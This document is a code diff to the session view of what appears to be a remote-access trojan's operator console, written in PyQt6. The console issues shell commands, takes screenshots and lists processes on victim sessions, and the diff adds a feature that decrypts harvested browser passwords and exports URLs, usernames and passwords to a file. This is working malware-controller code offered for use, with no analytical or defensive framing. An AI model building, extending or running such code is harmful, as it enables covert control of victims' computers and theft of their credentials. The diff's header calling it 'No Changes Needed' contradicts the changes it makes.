@@ -1,19 +1,18 @@
-# ui/session_view.py (Corrected Imports)
+# ui/session_view.py (Verified, No Changes Needed - Logic was correct)
 import uuid
 from datetime import datetime
 import base64
 import json
 from PyQt6.QtWidgets import (QWidget, QVBoxLayout, QHBoxLayout, QPushButton, QLabel, 
-                             QTabWidget, QDialog, QScrollArea)
+                             QTabWidget, QDialog, QScrollArea, QMessageBox, QFileDialog)
 from PyQt6.QtCore import pyqtSignal, Qt
 from PyQt6.QtGui import QPixmap
-
-# Corrected: Imports are now absolute from the project root
 from ui.discord_pane import DiscordPane
 from ui.terminal_pane import TerminalPane
 from ui.live_actions_pane import LiveActionsPane
 from ui.events_pane import EventsPane
 from ui.data_harvest_pane import DataHarvestPane
+from ui.decryption_util import Decryptor
 
 class ScreenshotDialog(QDialog):
     def __init__(self, pixmap, parent=None):
@@ -36,6 +35,7 @@ class SessionView(QWidget):
         super().__init__()
         self.db = db_manager
         self.current_session_id = None
+        self.current_session_data = None
         self.response_map = {}
         
         main_layout = QVBoxLayout(self)
@@ -81,9 +81,13 @@ class SessionView(QWidget):
         self.liveactions_pane.screenshot_requested.connect(self.send_screenshot_task)
         self.liveactions_pane.pslist_requested.connect(self.send_pslist_task)
         self.terminal_pane.command_entered.connect(self.send_terminal_command)
+        
+        # This line will now work correctly
+        self.data_harvest_pane.decryption_requested.connect(self.handle_decryption)
     
     def load_session(self, session_id, session_data):
         self.current_session_id = session_id
+        self.current_session_data = session_data
         metadata = session_data.get('metadata', {})
         status = session_data.get('status', 'Offline')
 
@@ -92,7 +96,6 @@ class SessionView(QWidget):
         self.events_pane.clear_events()
         self.data_harvest_pane.clear_all_views()
         
-        # Load all vault data for this session
         for module_name, data_packet in session_data.items():
             if module_name not in ["metadata", "status"]:
                 self.handle_data_packet(module_name, data_packet)
@@ -103,8 +106,7 @@ class SessionView(QWidget):
         
         self.status_label.setText(status.upper())
         self.status_label.setProperty("status", status.lower())
-        self.status_label.style().unpolish(self.status_label)
-        self.status_label.style().polish(self.status_label)
+        self.status_label.style().unpolish(self.status_label); self.status_label.style().polish(self.status_label)
         
         self.tabs.setCurrentIndex(0)
 
@@ -113,8 +115,7 @@ class SessionView(QWidget):
         self.data_harvest_pane.update_view(command, output)
 
     def send_terminal_command(self, command):
-        task = {"action": "shell", "params": {"command": command}}
-        self._send_task(task)
+        self._send_task({"action": "shell", "params": {"command": command}})
 
     def send_screenshot_task(self):
         self._send_task({"action": "screenshot", "params": {}})
@@ -124,8 +125,7 @@ class SessionView(QWidget):
 
     def _send_task(self, task_data):
         if self.current_session_id:
-            response_id = str(uuid.uuid4())
-            task_data["response_id"] = response_id
+            response_id = str(uuid.uuid4()); task_data["response_id"] = response_id
             self.response_map[response_id] = task_data
             self.task_requested.emit(self.current_session_id, task_data)
 
@@ -137,25 +137,47 @@ class SessionView(QWidget):
         
         if not original_task: return
 
-        result = response_data.get('result', {})
-        data = result.get('data', '[No data received]')
-        status = result.get('status')
-        action = original_task.get('action', 'unknown')
+        result = response_data.get('result', {}); data = result.get('data', '[No data received]')
+        status = result.get('status'); action = original_task.get('action', 'unknown')
 
         if status == 'error':
             self.events_pane.add_event(f"[{datetime.now():%H:%M:%S}] [ERROR] Action '{action}' failed: {data}")
             return
         
-        if action == "shell":
-            self.terminal_pane.append_output(f"{data}\n")
-        elif action == "pslist":
-            self.liveactions_pane.display_result(f"--- Process List @ {datetime.now():%Y-%m-%d %H:%M:%S} ---\n{data}\n")
+        if action == "shell": self.terminal_pane.append_output(f"{data}\n")
+        elif action == "pslist": self.liveactions_pane.display_result(f"--- Process List @ {datetime.now():%Y-%m-%d %H:%M:%S} ---\n{data}\n")
         elif action == "screenshot":
             try:
-                img_data = base64.b64decode(data)
-                pixmap = QPixmap()
-                pixmap.loadFromData(img_data)
-                dialog = ScreenshotDialog(pixmap, self)
-                dialog.exec()
+                img_data = base64.b64decode(data); pixmap = QPixmap(); pixmap.loadFromData(img_data)
+                dialog = ScreenshotDialog(pixmap, self); dialog.exec()
             except Exception as e:
                 self.events_pane.add_event(f"[{datetime.now():%H:%M:%S}] [ERROR] Could not display screenshot: {e}")
+    
+    def handle_decryption(self):
+        if not self.current_session_data:
+            QMessageBox.warning(self, "No Data", "Session data has not been loaded.")
+            return
+
+        decryptor = Decryptor(self.current_session_data)
+        results = decryptor.decrypt_passwords()
+
+        if isinstance(results, dict) and "error" in results:
+            QMessageBox.warning(self, "Decryption Failed", results["error"])
+            return
+
+        if not results:
+            QMessageBox.information(self, "No Passwords", "No decryptable passwords were found in the provided data.")
+            return
+
+        save_path, _ = QFileDialog.getSaveFileName(self, "Save Decrypted Passwords", "", "JSON Files (*.json);;Text Files (*.txt)")
+        if save_path:
+            try:
+                with open(save_path, 'w', encoding='utf-8') as f:
+                    if save_path.endswith(".json"):
+                        json.dump(results, f, indent=4)
+                    else:
+                        for item in results:
+                            f.write(f"URL: {item[0]}\nUsername: {item[1]}\nPassword: {item[2]}\n\n")
+                QMessageBox.information(self, "Success", f"Decrypted data saved to:\n{save_path}")
+            except Exception as e:
+                QMessageBox.critical(self, "Error Saving File", str(e))
